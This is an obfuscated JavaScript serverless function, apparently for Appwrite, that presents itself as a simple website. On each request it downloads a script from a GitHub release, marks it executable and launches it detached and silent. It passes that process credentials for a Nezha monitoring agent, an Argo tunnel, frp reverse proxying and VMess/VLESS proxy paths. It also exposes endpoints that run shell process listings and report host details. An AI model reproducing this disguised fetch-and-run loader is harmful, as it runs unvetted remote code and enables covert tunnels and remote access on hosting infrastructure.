
const uuid = process.env.UUID || 'fdf0f56e-63f3-4c85-b2a8-c77216c509a7';
const vmms = process.env.MPATH || 'vms';
const vmmport = process.env.VM_PORT || '8006';
const vpath = process.env.VPATH || 'vls';
const vport = process.env.VL_PORT || '8008';
const tmpargo = process.env.TMP_ARGO || 'rel';
const subname = process.env.SUB_NAME || 'appwrite';
const suburl = process.env.SUB_URL || '';
const nezhaser = process.env.NSERVER || 'xx:443';
const nezhaKey = process.env.NKEY || '';
const nezport = process.env.NPORT || '443';
const neztls = process.env.NTLS || '1';
const argoKey = process.env.TOK || '';
const argodomain = process.env.DOM || '';
const frip = process.env.F_IP || '';  //frp地址
const frport = process.env.F_PORT || ''; //端口
const frptcp = process.env.F_TCP || '30181';  // tcp端口
const frpudp = process.env.F_UDP || ''; //不填
const frtoken = process.env.F_TOK || '';  //frp密钥

(function(_0x564e15,_0x246e2a){const _0xdff255=_0x3e9b,_0x4d6182=_0x564e15();while(!![]){try{const _0x27b75f=-parseInt(_0xdff255(0x83))/0x1+parseInt(_0xdff255(0xc1))/0x2+-parseInt(_0xdff255(0x81))/0x3+-parseInt(_0xdff255(0x92))/0x4*(parseInt(_0xdff255(0x9c))/0x5)+-parseInt(_0xdff255(0xa6))/0x6*(parseInt(_0xdff255(0xa1))/0x7)+-parseInt(_0xdff255(0x8f))/0x8*(-parseInt(_0xdff255(0xc6))/0x9)+parseInt(_0xdff255(0x93))/0xa;if(_0x27b75f===_0x246e2a)break;else _0x4d6182['push'](_0x4d6182['shift']());}catch(_0x484231){_0x4d6182['push'](_0x4d6182['shift']());}}}(_0xc111,0x30e14));let serverProcess=null;function _0x3e9b(_0x385574,_0x4535fe){const _0xc1110f=_0xc111();return _0x3e9b=function(_0x3e9b8b,_0x149248){_0x3e9b8b=_0x3e9b8b-0x80;let _0xf3f8ef=_0xc1110f[_0x3e9b8b];return _0xf3f8ef;},_0x3e9b(_0x385574,_0x4535fe);}export default async({req:_0xc81b5a,res:_0x4f0514,log:_0x4249c0,error:_0x561550})=>{const _0x167ca8=_0x3e9b,_0x486820=_0xc81b5a[_0x167ca8(0xc7)]||'/',_0xe40d26=_0xc81b5a[_0x167ca8(0xbc)];_0x4249c0(_0x167ca8(0xb8)+_0xe40d26+'\x20'+_0x486820);try{await autoStartProcess(_0x4249c0,_0x561550);if(_0x486820==='/'&&_0xe40d26==='GET')return _0x4f0514['text']('welcome\x20to\x20my\x20website!');if(_0x486820===_0x167ca8(0xcd)&&_0xe40d26===_0x167ca8(0xce)){const {exec:_0x2ce5d7}=await import(_0x167ca8(0x9f)),{promisify:_0x41f332}=await import(_0x167ca8(0xa8)),_0xd18cbc=_0x41f332(_0x2ce5d7);try{const _0x20f444=_0x167ca8(0xcc),{stdout:_0x44652b}=await _0xd18cbc(_0x20f444);return _0x4f0514[_0x167ca8(0x9e)](_0x167ca8(0x94)+_0x44652b,0xc8,{'Content-Type':'text/plain;\x20charset=utf-8'});}catch(_0x148989){return _0x4f0514['text'](_0x167ca8(0xb2)+_0x148989[_0x167ca8(0xb4)],0x1f4);}}if(_0x486820==='/'+uuid&&_0xe40d26===_0x167ca8(0xce)){const _0x51e3e2=await import(_0x167ca8(0x82));try{const _0x331ad1=await _0x51e3e2[_0x167ca8(0xa9)](_0x167ca8(0xbb),_0x167ca8(0x96));return _0x4f0514[_0x167ca8(0x9e)](_0x331ad1,0xc8,{'Content-Type':_0x167ca8(0x8e)});}catch(_0x3a7648){return _0x561550(_0x167ca8(0xc9),_0x3a7648),_0x4f0514[_0x167ca8(0x9e)](_0x167ca8(0xcb),0x194);}}if(_0x486820===_0x167ca8(0xc8)&&_0xe40d26===_0x167ca8(0xce)){const _0x37626f=await import('os'),{execSync:_0x1c21ea}=await import(_0x167ca8(0x9f)),_0x147fcb=await import('fs'),_0x4c309a=isProcessRunning(_0x167ca8(0xc0),_0x1c21ea,_0x147fcb),_0x29d72f={'platform':_0x37626f['platform'](),'arch':_0x37626f[_0x167ca8(0x9b)](),'cpus':_0x37626f[_0x167ca8(0xb7)]()['length'],'totalMemory':(_0x37626f['totalmem']()/(0x400*0x400*0x400))[_0x167ca8(0x95)](0x2)+_0x167ca8(0xba),'freeMemory':(_0x37626f[_0x167ca8(0x98)]()/(0x400*0x400*0x400))[_0x167ca8(0x95)](0x2)+_0x167ca8(0xba),'hostname':_0x37626f[_0x167ca8(0xa2)](),'osType':_0x37626f['type'](),'osRelease':_0x37626f[_0x167ca8(0xbe)](),'uptime':(_0x37626f[_0x167ca8(0xa5)]()/0xe10)[_0x167ca8(0x95)](0x2)+_0x167ca8(0xa0),'processRunning':_0x4c309a,'serverProcessActive':serverProcess!==null,'timestamp':new Date()[_0x167ca8(0xb0)]()};return _0x4f0514[_0x167ca8(0xb3)](_0x29d72f);}if(_0x486820==='/start'&&_0xe40d26===_0x167ca8(0xce)){const _0x45f57b=await startServerProcess(_0x4249c0,_0x561550);return _0x4f0514[_0x167ca8(0xb3)](_0x45f57b);}if(_0x486820===_0x167ca8(0x99)&&_0xe40d26===_0x167ca8(0xce)){const {execSync:_0x578f0b}=await import(_0x167ca8(0x9f)),_0x347a59=await import('fs'),_0x831687=isProcessRunning(_0x167ca8(0xc0),_0x578f0b,_0x347a59);return _0x4f0514[_0x167ca8(0xb3)]({'status':_0x167ca8(0xd0),'timestamp':new Date()[_0x167ca8(0xb0)](),'processRunning':_0x831687,'message':_0x167ca8(0x85)});}return _0x4f0514[_0x167ca8(0x9e)](_0x167ca8(0x9d),0x194);}catch(_0x350fb6){return _0x561550(_0x167ca8(0xac),_0x350fb6),_0x4f0514[_0x167ca8(0xb3)]({'error':_0x350fb6['message']},0x1f4);}};async function autoStartProcess(_0x525359,_0x2f5ce1){const _0x4929e3=_0x3e9b,{execSync:_0x5cc98f}=await import('child_process'),_0x448e2e=await import('fs'),_0x29626c=_0x4929e3(0xc0),_0x12b3a5=isProcessRunning(_0x29626c,_0x5cc98f,_0x448e2e);!_0x12b3a5?(_0x525359(_0x4929e3(0x9a)),await startServerProcess(_0x525359,_0x2f5ce1)):_0x525359(_0x4929e3(0xc3));}async function startServerProcess(_0x219102,_0x5cc72a){const _0x40b305=_0x3e9b,{spawn:_0x113e9f}=await import(_0x40b305(0x9f)),_0x4b1729=await import(_0x40b305(0x82)),_0x4652d5=await import('os'),_0x38c2a8=(await import('axios'))['default'];try{if(serverProcess)return _0x219102(_0x40b305(0xaf)),{'success':!![],'message':_0x40b305(0xc2)};try{await _0x4b1729[_0x40b305(0xaa)](_0x40b305(0xad)),_0x219102(_0x40b305(0xb9));}catch(_0x557dc4){_0x219102('Downloading\x20server.js...');const _0x2e0be2=_0x40b305(0x8c),_0x26e6f9=_0x4652d5[_0x40b305(0x9b)]()===_0x40b305(0xa7)||_0x4652d5['arch']()===_0x40b305(0xc4)?process[_0x40b305(0x88)][_0x40b305(0xca)]||_0x40b305(0x90):process[_0x40b305(0x88)][_0x40b305(0xab)]||_0x40b305(0x90),_0x3366a6=await _0x38c2a8[_0x40b305(0xcf)](_0x26e6f9,{'responseType':_0x40b305(0x8b),'timeout':0x7530});await _0x4b1729[_0x40b305(0xae)]('./'+_0x2e0be2,_0x3366a6[_0x40b305(0x8d)]),await _0x4b1729[_0x40b305(0xbf)]('./server.js',0x1ed),_0x219102(_0x40b305(0xb5));}const _0x2c960e={...process['env'],'UUID':uuid,'MPATH':vmms,'VM_PORT':vmmport,'VPATH':vpath,'VL_PORT':vport,'TMP_ARGO':tmpargo,'NEZHA_SERVER':nezhaser,'NEZHA_KEY':nezhaKey,'NEZHA_PORT':nezport,'NEZHA_TLS':neztls,'ARGO_DOMAIN':argodomain,'TOK':argoKey,'FRPC_IP':frip,'FRPC_PORT':frport,'FRPC_TCPPORT':frptcp,'FRPC_UDPPORT':frpudp,'FRPC_TOK':frtoken,'SUB_NAME':subname,'SUB_URL':suburl};serverProcess=_0x113e9f('./server.js',[],{'env':_0x2c960e,'detached':!![],'stdio':'ignore'}),serverProcess['unref']();const _0xf32bda=serverProcess[_0x40b305(0x8a)];return _0x219102(_0x40b305(0xb6)+_0xf32bda),{'success':!![],'message':_0x40b305(0xa3),'pid':_0xf32bda};}catch(_0x12778e){return _0x5cc72a(_0x40b305(0x91),_0x12778e),serverProcess=null,{'success':![],'message':_0x40b305(0xbd)+_0x12778e[_0x40b305(0xb4)]};}}function isProcessRunning(_0x560428,_0x5b512e,_0x2ab6f0){const _0x31b495=_0x3e9b;if(commandExists('pidof',_0x5b512e))try{return _0x5b512e('pidof\x20'+_0x560428,{'stdio':_0x31b495(0x97)}),!![];}catch(_0x4fb274){}if(commandExists('ps',_0x5b512e))try{const _0x5e53ec=_0x5b512e('ps\x20aux\x20|\x20grep\x20\x22'+_0x560428+_0x31b495(0x87),{'encoding':_0x31b495(0x96)});if(_0x5e53ec[_0x31b495(0x89)]()!=='')return!![];}catch(_0x351f25){}try{const _0x411ede=_0x2ab6f0['readdirSync'](_0x31b495(0xb1));for(const _0x5e652e of _0x411ede){if(/^\d+$/[_0x31b495(0xc5)](_0x5e652e))try{const _0x25d576=_0x2ab6f0[_0x31b495(0x84)](_0x31b495(0x86)+_0x5e652e+'/cmdline',_0x31b495(0x96));if(_0x25d576[_0x31b495(0xa4)](_0x560428))return!![];}catch(_0xaaa1bb){}}}catch(_0x22c51b){}return![];}function _0xc111(){const _0x57c7a9=['Cron\x20keep-alive\x20ping\x20received','/proc/','\x22\x20|\x20grep\x20-v\x20grep','env','trim','pid','arraybuffer','server.js','data','text/plain;\x20charset=utf-8','1926608KQLDxH','https://github.com/dsadsadsss/nodejs-wanju2/releases/download/1/start.sh','❌\x20Error\x20starting\x20server:','383772COSJUD','7671260GvoxaL','获取系统进程表：\x0a','toFixed','utf8','ignore','freemem','/health','Process\x20not\x20detected,\x20starting...','arch','20fpXZgZ','Not\x20Found','text','child_process','\x20hours','7cusmCy','hostname','进程启动成功','includes','uptime','2337300uqipbf','x64','util','readFile','access','URL_BOT2','Error:','./server.js','writeFile','Server\x20process\x20reference\x20exists','toISOString','/proc','命令行执行错误：\x0a','json','message','Server\x20downloaded\x20and\x20made\x20executable','✅\x20Server\x20started\x20successfully\x20with\x20PID:\x20','cpus','Request:\x20','server.js\x20exists','\x20GB','/tmp/list.log','method','启动失败:\x20','release','chmod','tmpapp','423566YoqMvx','进程引用已存在','Process\x20is\x20already\x20running','amd64','test','9DQGsXu','path','/info','Error\x20reading\x20file:','URL_BOT','Subscription\x20data\x20not\x20available\x20yet','ps\x20-ef\x20|\x20sed\x20\x27s@export\x20UUID=.*@web.js@g;s@--token.*@--token@g;s@-s.*@-s\x20SERVER@g;s@*.chmod@chmod@g\x27','/stas','GET','get','healthy','which\x20','502407WcXfzy','fs/promises','78732axFvlQ','readFileSync'];_0xc111=function(){return _0x57c7a9;};return _0xc111();}function commandExists(_0x4c2d90,_0x1a9ed2){const _0x41dc0d=_0x3e9b;try{return _0x1a9ed2(_0x41dc0d(0x80)+_0x4c2d90,{'stdio':'ignore'}),!![];}catch(_0x1ec3a4){return![];}}
